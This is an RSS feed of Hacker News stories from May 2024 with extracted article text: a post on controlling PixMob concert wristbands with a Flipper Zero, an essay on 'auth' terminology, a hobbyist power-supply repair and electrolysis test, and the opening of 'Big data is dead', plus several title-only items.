<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Mon, 27 May 2024 20:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Controlling the Taylor Swift Eras Tour wristbands with Flipper Zero (215 pts)]]></title>
            <link>https://blog.jgc.org/2024/05/controlling-taylor-swift-eras-tour.html</link>
            <guid>40492515</guid>
            <pubDate>Mon, 27 May 2024 16:55:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.jgc.org/2024/05/controlling-taylor-swift-eras-tour.html">https://blog.jgc.org/2024/05/controlling-taylor-swift-eras-tour.html</a>, See on <a href="https://news.ycombinator.com/item?id=40492515">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-4308511000929231325" itemprop="description articleBody">
<p>Many large concerts feature wristbands that light up on command. They are used to produce varied visual effects across a stadium. One company that makes these is <a href="https://pixmob.com/">PixMob</a>. Their controllable, illuminated wristbands are currently being used as part of <a href="https://en.wikipedia.org/wiki/The_Eras_Tour">Taylor Swift's Eras Tour</a>. A short Wired article <a href="https://wired.me/technology/the-tech-behind-taylor-swift-concert-wristbands/">here</a> gives some details and here's a video from the Wall Street Journal:</p><p><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="315" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/GCsmZA08oD8?si=e3755KHJFdna_zBV" title="YouTube video player" width="560"></iframe></p><p>For the Eras Tour the company's X2 product is being used. It looks like this:</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQg9Q19zegc3hBuX2vNtiBNssn2XKYwLKBcAw1y34T1bEwMY3ITvksGMnVa4Ifzt_yaCsWHZf8AJjHRMoiodRsSMp8nKfm13E-oldA1RQ9UEqRxJkF98UzunZfGwo49Nwp7xjCMGl56Prugv67T6tXT9msEmRpl2FDuvLMXef31xgDZij7j-5sdg/s3731/eras-1.jpg"><img data-original-height="1340" data-original-width="3731" height="230" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQg9Q19zegc3hBuX2vNtiBNssn2XKYwLKBcAw1y34T1bEwMY3ITvksGMnVa4Ifzt_yaCsWHZf8AJjHRMoiodRsSMp8nKfm13E-oldA1RQ9UEqRxJkF98UzunZfGwo49Nwp7xjCMGl56Prugv67T6tXT9msEmRpl2FDuvLMXef31xgDZij7j-5sdg/w640-h230/eras-1.jpg" width="640"></a></p><p>Since these wristbands are designed for reuse they are easily opened revealing two batteries and a lovely little circuit board:</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQsQ3X_JVN4fln9WOBbyohyphenhyphenrSuV8jFu_Cm-oYlf9pa7o5_2pv4AEzpDbRNTPGZcfA4bDvzVM_4qpvNB-jZRUuawJo28u9fjCIFNDXEh8SkR5TYxMGBi3B9qNBfNOf6ihbqAn23fhXdwywkCpLqO1nNZ6IroifiZtGkviBfCfKDQtivvgyy07zg-g/s2823/eras-2.jpg"><img data-original-height="2234" data-original-width="2823" height="506" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQsQ3X_JVN4fln9WOBbyohyphenhyphenrSuV8jFu_Cm-oYlf9pa7o5_2pv4AEzpDbRNTPGZcfA4bDvzVM_4qpvNB-jZRUuawJo28u9fjCIFNDXEh8SkR5TYxMGBi3B9qNBfNOf6ihbqAn23fhXdwywkCpLqO1nNZ6IroifiZtGkviBfCfKDQtivvgyy07zg-g/w640-h506/eras-2.jpg" width="640"></a></p><p>Here's that circuit board:</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgu9JtblHe06nqdgEHaGGxg7jAha5zSxrJnkZYcUoCdAz3jHfeZ07_9waLR0RW8SvvyjkHfDqz_ak_M0bIZCrE0v-08Q5raviX844Mgm_bZf9gpQROLKtlUwuatt0_2ErTXD6HEAsR-vCm8HmYFADwmYYJo490ez5xksNqmlm8v63vBefTl6PQqCg/s3483/eras-3.jpg"><img data-original-height="1996" data-original-width="3483" height="366" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgu9JtblHe06nqdgEHaGGxg7jAha5zSxrJnkZYcUoCdAz3jHfeZ07_9waLR0RW8SvvyjkHfDqz_ak_M0bIZCrE0v-08Q5raviX844Mgm_bZf9gpQROLKtlUwuatt0_2ErTXD6HEAsR-vCm8HmYFADwmYYJo490ez5xksNqmlm8v63vBefTl6PQqCg/w640-h366/eras-3.jpg" width="640"></a></p><p>On that board are two RGB LEDs, a little microcontroller, a little bit of EEPROM and an infrared diode to receive a signal. So, simply put, PixMob works by installed a really big (and moveable) IR remote control (you can read about this on their website <a href="https://pixmob.com/our-effects">here</a>) and transmitting commands to the bracelets to produce colours, fades, flashes, etc. Cute.</p><p>There are a bunch of hardware details <a href="https://yeokhengmeng.com/2019/08/teardown-of-ndp2019-led-wristband/">here</a>.</p><p>Since they are projecting infrared with moveable projector they can sweep effects around the stadium, and cover the projector with cut outs to make things like hearts. It's simple technology that works very nicely. And, of course, there's a reverse engineering community built up around this.</p><p>The best place to start learning about that is <a href="https://github.com/danielweidman/pixmob-ir-reverse-engineering">this</a> GitHub repository. It brings together a bunch of reverse engineering efforts that have looked into the IR protocol. These have been somewhat successful and, since the <a href="https://flipperzero.one/">Flipper Zero</a> has IR capability, there's a <a href="https://github.com/danielweidman/flipper-pixmob-ir-codes">project</a> that makes it control the wristband.</p><p>Here's a short video of me making the wristbands fade orange.</p><p>Such nice simple technology that produces very cool effects.</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Internet Archive is under a DDoS attack (191 pts)]]></title>
            <link>https://bsky.app/profile/archive.org/post/3ktiatctiqm2r</link>
            <guid>40492264</guid>
            <pubDate>Mon, 27 May 2024 16:28:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bsky.app/profile/archive.org/post/3ktiatctiqm2r">https://bsky.app/profile/archive.org/post/3ktiatctiqm2r</a>, See on <a href="https://news.ycombinator.com/item?id=40492264">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Internet Archive is under a DDoS attack (130 pts)]]></title>
            <link>https://mastodon.archive.org/@internetarchive/112513905401989149</link>
            <guid>40492076</guid>
            <pubDate>Mon, 27 May 2024 16:08:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mastodon.archive.org/@internetarchive/112513905401989149">https://mastodon.archive.org/@internetarchive/112513905401989149</a>, See on <a href="https://news.ycombinator.com/item?id=40492076">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Should I use JWTs for authentication tokens? (174 pts)]]></title>
            <link>https://blog.ploetzli.ch/2024/should-i-use-jwt-for-authentication/</link>
            <guid>40491694</guid>
            <pubDate>Mon, 27 May 2024 15:31:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.ploetzli.ch/2024/should-i-use-jwt-for-authentication/">https://blog.ploetzli.ch/2024/should-i-use-jwt-for-authentication/</a>, See on <a href="https://news.ycombinator.com/item?id=40491694">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Instead of "auth", we should say "permissions" and "login" (363 pts)]]></title>
            <link>https://ntietz.com/blog/lets-say-instead-of-auth/</link>
            <guid>40491480</guid>
            <pubDate>Mon, 27 May 2024 15:11:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ntietz.com/blog/lets-say-instead-of-auth/">https://ntietz.com/blog/lets-say-instead-of-auth/</a>, See on <a href="https://news.ycombinator.com/item?id=40491480">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Most computer systems we interact with have an auth system of some kind.
The problem is, that sentence is at best unclear and at worst nonsense.
"Auth" can mean at least two things: authentication or authorization<sup><a href="#or-verb-forms">1</a></sup>.
Which do we mean for an "auth system"?
It's never perfectly clear and, unfortunately, we often mean <em>both</em>.</p>
<p>This is a widespread problem, and it's well known.
One common solution, using the terms "authn" and "authz", doesn't solve the problem.
And this isn't just confusing, it leads to bad abstractions and general failures!</p>
<p><img src="https://ntietz.com/images/comics/logging-in.png" alt="Comic about an ambiguity in the term &quot;log in.&quot;" title="Tech support thought they had seen it all, but they hadn't met Sam yet"></p>
<h2 id="the-current-terms-fall-short">The current terms fall short</h2>
<p>Calling things just "auth" is common.
It's used in library names (<a href="https://docs.allauth.org/en/latest/">django-allauth</a> is for authentication, and <a href="https://github.com/go-pkgz/auth">go-auth</a> is also authentication), package names (<code>django.contrib.auth</code>, which does both authentication and authorization), and even <a href="https://auth0.com/">company names</a>.</p>
<p>Since "auth" can mean two things, this naming leads to ambiguities.
When you see a new auth library or product, you don't know right away what it's able to handle.
And when you talk about it, it's also not clear what you're referring to.</p>
<p>The canonical solution is to call these "authn" and "authz", the n and z evoking the longer words.
Thes are just not satisfactory, though.
They're clunky and hard to understand: they're not universal enough to be able to skip explanation; they're easy to mishear and are close together; and what verb forms would we even use?</p>
<p>It's not just about bad communication, though.
This terminology implies that the two concepts, authentication and authorization, are more closely related than they are.
It encourages bad abstractions to combine them, because we have one word, so we feel like they <em>should</em> belong together.
But they are two pretty fundamentally distinct problems: checking who you are<sup><a href="#other-assertions">2</a></sup>, and specifying access rights.</p>
<p>There are some links between auth and auth<sup><a href="#sorry">3</a></sup>, because what you can do is tied to who you are.
But they're also very different, and deserve to be treated that way.
At the very least, recognizing that they're different leads to recognition that solving one does <em>not</em> solve the other.</p>
<h2 id="intead-use-permissions-and-login">Intead, use "permissions" and "login"</h2>
<p>We should always use the most clear terms we have.
Sometimes there's not a great option, but here, we have <em>wonderfully</em> clear terms.
Those are "login" for authentication and "permissions" for authorization.
Both are terms that will make sense with little explanation (in contrast to "authn" and "authz", which are confusing on first encounter) since almost everyone has logged into a system and has run into permissions issues.</p>
<p>There are two ways to use "login" here: the noun and the verb form.
The noun form is "login", which refers to the information you enter to gain access to the system.
And the verb form is "log in", which refers to the <em>action</em> of entering your login to use the system.</p>
<p>"Permissions" is just the noun form.
To use a verb, you would use "check permissions."
While this is long, it's also just... fine?
It hasn't been an issue in my experience.</p>
<p>Both of these are abundantly clear even to our peers in disciplines outside software engineering.
This to me makes it worth using them from a clarity perspective alone.
But then we have the big benefit to abstractions, as well.</p>
<p>When we call both by the same word, there's often an urge to combine them into a single module just by dint of the terminology.
This isn't necessarily wrong—there is certainly some merit to put them together, since permissions typically require a login.
But it's not necessary, either, and our designs will be stronger if we don't make that assumption and instead make a reasoned choice.</p>
<hr>



</div><p>
    If this post was enjoyable or useful for you, <strong>please share it!</strong>
    If you have comments, questions, or feedback, you can email <a href="mailto:me@ntietz.com">my personal email</a>.
    To get new posts and support my work, subscribe to the <a href="https://ntietz.com/newsletter/">newsletter</a>. There is also an <a href="https://ntietz.com/atom.xml">RSS feed</a>.
  </p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Resume Tip: Hacking "AI" screening of resumes (128 pts)]]></title>
            <link>https://www.solipsys.co.uk/images/ResumeTip.png</link>
            <guid>40489596</guid>
            <pubDate>Mon, 27 May 2024 11:01:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.solipsys.co.uk/images/ResumeTip.png">https://www.solipsys.co.uk/images/ResumeTip.png</a>, See on <a href="https://news.ycombinator.com/item?id=40489596">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[My new PSU burns out I fix it, and torture it by cracking water (143 pts)]]></title>
            <link>https://tomscii.sig7.se/2024/05/PSU-burnout-and-torture-cracking-water</link>
            <guid>40489269</guid>
            <pubDate>Mon, 27 May 2024 09:55:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tomscii.sig7.se/2024/05/PSU-burnout-and-torture-cracking-water">https://tomscii.sig7.se/2024/05/PSU-burnout-and-torture-cracking-water</a>, See on <a href="https://news.ycombinator.com/item?id=40489269">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">
  
  <div itemprop="articleBody">
    <p><a href="https://tomscii.sig7.se/2024/04/300W-Linear-DualTracking-Lab-PSU">My brand new PSU</a>, the
most complicated circuit I designed and built just recently, started
life in October 2023. It seemed to work pretty well, at least I got
through the long and dark winter with it feeding my LED Superlamp.
(Most of the time. The rest of that time, I was using it for something
it was actually intended for, i.e., the feeding of an experimental
new circuit. By the light of a torch.)</p>

<!--more-->

<h2 id="mind-the-gap---or-blow-a-pcb-track">Mind the gap - or blow a PCB track!</h2>

<p>Then one day towards early Spring, while I was just sitting there,
<em>something</em> happened. I remember I was not doing anything in
particular when my subconscious alerted me to some weirdness going
on. I slowly came to realise that the weirdness was a really sharp bad
smell. A smell of something burning, or close to burning. I looked at
my bench supply – I clearly remember it was turned on but there
was nothing connected to it at the moment. And it seemed to be OK, at
least all the LED displays were lit up. But the voltage indicator was
strangely zeroed out, clearly in spite of the control settings.</p>

<p>Instinctively, I turned the instrument off, probably even before all
the above has fully gone through my head. Sniffing closer confirmed my
suspicion that the smell was indeed coming from my bench supply. I was
more than a little bit confused – what could cause such a sudden
and seemingly unprovoked failure (at idle load!) after several months
of trouble-free operation?  I mean, design errors would surely have
come out by now, and being relatively fresh off the proverbial factory
line, we are hopefully still a long way from any possible component
wear-out… I was intrigued. It was late in the day and it was already
dark (and I just lost the only power supply to my Superlamp), so I
called it a day.</p>

<p>And by the first rays of light of the next dawn, this is what I saw:</p>

<p><a href="https://tomscii.sig7.se/images/linear-dual-lab-psu/pcb-fail1.jpg"><img src="https://tomscii.sig7.se/images/linear-dual-lab-psu/pcb-fail1-thumb.jpg" alt=""></a><br>
<em>PCB failure (click to enlarge)</em></p>

<p>Ouch, that PCB track in the middle got badly burned. So badly, in
fact, that a couple millimeters of the track simply disappeared (right
under the large C7 capacitor, left of the heatsinked Q9). Not for the
faint of heart!</p>

<p>Strange that the 2.5A primary side fuse (integrated into the AC inlet)
did not melt. And strangely, all the components seemed intact. I would
have expected a blown up capacitor or a shattered transistor or IC.
But nothing of that sort of catastrophe in sight – everything in
seemingly pristine condition. Except for the PCB itself.</p>

<p>Here is a better picture I took after disconnecting the wiring and
freeing the board for even closer inspection:</p>

<p><a href="https://tomscii.sig7.se/images/linear-dual-lab-psu/pcb-fail2.jpg"><img src="https://tomscii.sig7.se/images/linear-dual-lab-psu/pcb-fail2-thumb.jpg" alt=""></a><br>
<em>Same failure after disassembly, board plane view (click to enlarge)</em></p>

<p>So it looks like the VIN+ track (coming right from the unregulated
supply) got shorted to the ground plane, right below the ground
connection of C7. That track is 80&nbsp;mils (2&nbsp;mm) wide,
carefully sized to withstand 5A of steady current with only a
+20°C rise in temperature. So that alone cannot be the problem
– and again, there was zero load when this happened.</p>

<p>Apparently, the 8-mil (0.2&nbsp;mm) clearance between VIN+ and ground
was simply not enough to keep the 40-or-so volts apart. (It was not a
turn-on inrush event, as the instrument has been powered on for a
while.) Maybe the gap between the copper tracks was dirty (flux
remains?) which lead to increased conduction? Maybe the capacitor
being there had something to do with it? I did not really know.</p>

<p>Doing some further research I found
<a href="http://creepage.com/">creepage.com</a>, which contains an online
calculator of safety distances for <em>creepage</em>. This term refers to the
event of conduction across the surface of an insulator (such as the
gap across PCB tracks). The website allows you to get a safe distance
between conductors in the face of various voltages and environmental
conditions, according to several different industry standards.</p>

<p>So I played around with it and the result I got was (according to the
various environmental parameters, coating materials, and safety
standards I chose) somewhere between 1.0&nbsp;mm and 1.2&nbsp;mm. How
embarrassing! My PCB design is thus entirely worthless, because I did
not pay any attention to this – and the required distances are
<em>much</em> larger than I would have thought.  Another hard-earned lesson!</p>

<h2 id="mending-it">Mending it</h2>

<p>Okay, so can we salvage our wreck? After careful inspection and
ultimate removal of the charred remains of the track, I reached the
conclusion (supported by several measurements) that the rest of the
PCB survived intact, including all the components on it. The only
actual victim was the positive-side outboard pass transistor, which
did not show any external signs of damage, but DMM readouts were
contrary to what I would expect of an NPN power transistor that is
still kicking alive. So I swapped in a new part there. And I put in a
nice and thick insulated copper wire between the screw terminals of
VIN+ and the collector of Q5, the only connection that got severed by
the burn.</p>

<p>And after some further deliberation (what could possibly go wrong?) I
flipped the power on…</p>

<p><em>And it worked!</em> At least voltages seemed okay (without any load), the
readouts reacted to knob action, and no part started to burn.  All
good?</p>

<p>In a sigh of relief, I said to myself <em>I’m just gonna have to give this
baby a good workout!</em></p>



<p>While originally testing the PSU, I used some wire-wound power
inductors in the range of a few to a couple dozen Watts. Now I wanted
something bigger and badder: a test load that could steadily sink lots
of amperes (at a mostly-resistive impedance) without getting into any
trouble!</p>

<p>Enter the old classroom physics experiment I always wanted to try
myself:
<a href="https://en.wikipedia.org/wiki/Electrolysis_of_water">electrolysis</a>.
That requires a hefty source of DC current, and this seemed like the
perfect occasion.</p>

<p><a href="https://tomscii.sig7.se/images/linear-dual-lab-psu/cracker-parts.jpg"><img src="https://tomscii.sig7.se/images/linear-dual-lab-psu/cracker-parts-thumb.jpg" alt=""></a><br>
<em>All you need to build an electrolysis device (click to enlarge)</em></p>

<p>Above you can see all it takes to build an electrolysis tank on a
close to zero budget: a lunchbox (of the vertically aligned type), a
pair of PET bottles, a pair of stainless steel balloon whisks and
steel wool.</p>

<p>The design of my electrolysis tank was greatly inspired by <a href="https://www.youtube.com/watch?v=d85OX6yEwE0">this
video</a>. I highly
recommend watching it all the way through – I found it to be an
excellent source of practical ideas and overall inspiration!</p>

<p>My lunchbox-tank has a well fitting top (with a small, sealable
opening useful for pouring stuff in, then closing it for safety).
Still, I opted for the milder <a href="https://en.wikipedia.org/wiki/Sodium_bicarbonate">sodium
bicarbonate</a>
(<em>baking soda</em>) as the electrolyte instead of the more commonly used
<a href="https://en.wikipedia.org/wiki/Sodium_hydroxide">sodium hydroxide</a>
(<em>caustic soda</em>) or <a href="https://en.wikipedia.org/wiki/Potassium_hydroxide">potassium
hydroxide</a>, as
those are dangerously strong bases. This means less conductivity
between the electrodes, but also the absence of hazardous material.
Note that the bottle caps are drilled through so the gases are let out
at the top. They never mix within the tank.</p>

<p>I poured exactly one liter of warm water into the tank and started to
record the current at every five volts, from 5V to 35V. After each
round, I increased the concentration by adding one scoop (5&nbsp;ml)
of baking soda to the tank. I read voltages and currents directly off
the PSU’s digital displays. Here is a plot of the results:</p>

<p><a href="https://tomscii.sig7.se/files/linear-dual-lab-psu/crack-graph.png"><img src="https://tomscii.sig7.se/files/linear-dual-lab-psu/crack-graph.png" alt=""></a></p>

<p>Download the <a href="https://tomscii.sig7.se/files/linear-dual-lab-psu/crack-data.csv">raw data</a> and
the <a href="https://tomscii.sig7.se/files/linear-dual-lab-psu/crack-graph.plt">gnuplot script</a> if
you wish.</p>

<p>In line with prior expectations, conductivity of the electrolytic
solution of sodium bicarbonate increases in proportion with the
concentration of charged particles (ions) in the water. At a given
concentration, the tank behaves pretty much as a resistor (with a
linear relationship between its DC voltage and current).</p>

<p>The very first measurement round was made with pure tap water (indexed
with the number 0, as there were zero scoops of baking soda in it).
There is <em>some</em> current flowing, but very little, equivalent to about
2&nbsp;kΩ of resistance. That resistance dropped to around
40Ω after the first scoop of soda, 14Ω after 5 scoops,
8Ω after 10 scoops and 6Ω after 15 scoops.</p>

<p>It also seems like there is a tapering effect: the additional
conductivity yielded by each new scoop of soda is diminishing. I don’t
know enough about the science of this to judge whether this effect is
real, but moving upwards, the space between adjacent curves seems to
be shrinking.  There is some irregularity to it (visible as a gap
between graphs 7 and 8, and a smaller one between 4 and 5), but I
think that might be due to me not mixing the contents of the tank well
enough to dissolve all newly added powder. This might also explain the
slight convexity seen in curves 1 and 2: I did not yet realize that I
have to mix the tank, so the soda dissolved gradually while I was
moving towards higher voltages.</p>

<p>I got a little impatient towards the end, so after the tenth scoop I
started adding more at once. First a double (reaching 12 scoops) and
then three more (for a total of 15). The bench supply did its part,
but it reached the limits of what the mains transformer could supply
– above 4 amps, the secondary voltage started to drop below 36V.
But the electronics took the beating and nothing melted or burned.</p>

<p>The intensity of bubbling in the tank increased in direct proportion
to the current (again, as expected). And the tank also got quite warm,
due to the substantial power dissipated in its volume of water.</p>

<p><a href="https://tomscii.sig7.se/images/linear-dual-lab-psu/cracker-action.jpg"><img src="https://tomscii.sig7.se/images/linear-dual-lab-psu/cracker-action-thumb.jpg" alt=""></a><br>
<em>In action, with some 120 Watts absorbed by the tank (click to enlarge)</em></p>

<h2 id="conclusion">Conclusion</h2>

<p>So the clearances between some of the higher voltage tracks have
serious violations of the required distances to be safe from
creepage. As a result, one of the tracks has spontaneously
self-destructed, but there are a couple more places on the PCB where a
similar thing could happen basically any time. I am curious (in a less
than ideal way) of whether that would in fact happen…</p>

<p>At the end of the day, this is just another one of several design
flaws that would need to be addressed if I ever made a second build of
this kind of power supply. But for the time being, I will definitely
keep using this device. I have put it through some serious testing and
it passed with flying colours. We will see how it holds up, and (if it
should come to that) which part of the PCB will give in next!</p>

<p>Having tasted the sweet fruit of 8-mil tracks (and clearances)
bringing the ability to design fairly dense circuits, I need to
remember the lesson: there must be some real <em>distance</em> to insulate
voltages higher than a couple volts. As a reminder, there is this
ticking bomb sitting right here on my desk…</p>

<p>What? Did you say I should not be making gaseous hydrogen right next
to it? I mean, what could <em>possibly</em> <a href="https://en.wikipedia.org/wiki/Hindenburg_disaster">go
wrong</a>?</p>



<p><em>Update:</em> this article was discussed on the <a href="https://news.ycombinator.com/item?id=40489269">orange
site</a>.</p>

  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Big data is dead (2023) (428 pts)]]></title>
            <link>https://motherduck.com/blog/big-data-is-dead/</link>
            <guid>40488844</guid>
            <pubDate>Mon, 27 May 2024 08:30:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://motherduck.com/blog/big-data-is-dead/">https://motherduck.com/blog/big-data-is-dead/</a>, See on <a href="https://news.ycombinator.com/item?id=40488844">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>For more than a decade now, the fact that people have a hard time gaining actionable insights from their data has been blamed on its size. “Your data is too big for your puny systems,” was the diagnosis, and the cure was to buy some new fancy technology that can handle massive scale. Of course, after the Big Data task force purchased all new tooling and migrated from Legacy systems, people found that they still were having trouble making sense of their data. They also may have noticed, if they were really paying attention, that data size wasn’t really the problem at all.</p>
<p>The world in 2023 looks different from when the Big Data alarm bells started going off. The data cataclysm that had been predicted hasn’t come to pass. Data sizes may have gotten marginally larger, but hardware has gotten bigger at an even faster rate. Vendors are still pushing their ability to scale, but practitioners are starting to wonder how any of that relates to their real world problems.</p>
<section><h2 id="who-am-i-and-why-do-i-care">Who am I and why do I care?</h2><p>For more than 10 years, I was one of the acolytes beating the Big Data drum. I was a founding engineer on Google BigQuery, and as the only engineer on the team that actually liked public speaking, I got to travel to conferences around the world to help explain how we were going to help folks withstand the coming data explosion. I used to query a petabyte live on stage, demonstrating that no matter how big and bad your data was, we would be able to handle it, no problem.</p><img alt="Jordan Tigani at Big Data Spain" sizes="90vw,
                        (min-width: 728px) 688px,
                        (min-width: 960px) 840px,
                        (min-width: 1302px) 816px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_1_94000dd99e.jpg&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"><p><i>This photo was me at Big Data Spain in 2012, warning of the dangers of giant datasets and promising relief if they just use our technology.</i></p><p>Over the next few years I spent a lot of time debugging problems that customers were having with BigQuery. I co-wrote two books and really dug into how the product was being used. In 2018, I switched to product management, and my job was split between talking to customers, many of whom were the largest enterprises in the world, and analyzing product metrics.</p><p>The most surprising thing that I learned was that most of the people using “Big Query” don’t really have Big Data. Even the ones who do tend to use workloads that only use a small fraction of their dataset sizes. When BigQuery came out, it was like science fiction for many people-- you literally couldn’t process data that fast in any other way. However, what was science fiction is now commonplace, and more traditional ways of processing your data have caught up.</p><p><strong>About this post</strong></p><p>This post will make the case that the era of Big Data is over. It had a good run, but now we can stop worrying about data size and focus on how we’re going to use it to make better decisions. I’ll show a number of graphs; these are all hand-drawn based on memory. If I did have access to the exact numbers, I wouldn’t be able to share them. But the important part is the shape, rather than the exact values.</p><p>The data behind the graphs come from having analyzed query logs, deal post-mortems, benchmark results (published and unpublished), customer support tickets, customer conversations, service logs, and published blog posts, plus a bit of intuition.</p></section>
<section><h2 id="the-obligatory-intro-slide">The obligatory intro slide</h2><p>For the last 10 years, every pitch deck for every big data product starts with a slide that looks something like this:
<img alt="data generated over time increasing" sizes="90vw,
                        (min-width: 728px) 688px,
                        (min-width: 960px) 840px,
                        (min-width: 1302px) 816px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_2_0f68796072.jpg&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>We used a version of this slide for years at Google. When I moved to SingleStore, they were using their own version that had the same chart. I’ve seen several other vendors with something similar. This is the “scare” slide. Big Data is coming! You need to buy what I’m selling!</p><p>The message was that old ways of handling data were not going to work. The acceleration of data generation was going to leave the data systems of yesteryear stuck in the mud, and anyone who embraced new ideas would be able to leapfrog their competitors.</p><p>Of course, just because the amount of data being generated is increasing doesn’t mean that it becomes a problem for everyone; data is not distributed equally. Most applications do not need to process massive amounts of data. This has led to a resurgence in data management systems with traditional architectures; SQLite, Postgres, MySQL are all growing strongly, while “NoSQL” and even “NewSQL” systems are stagnating.</p><img alt="DB Engines scores over time MongoDB versus MySQL" sizes="90vw,
                        (min-width: 728px) 688px,
                        (min-width: 960px) 840px,
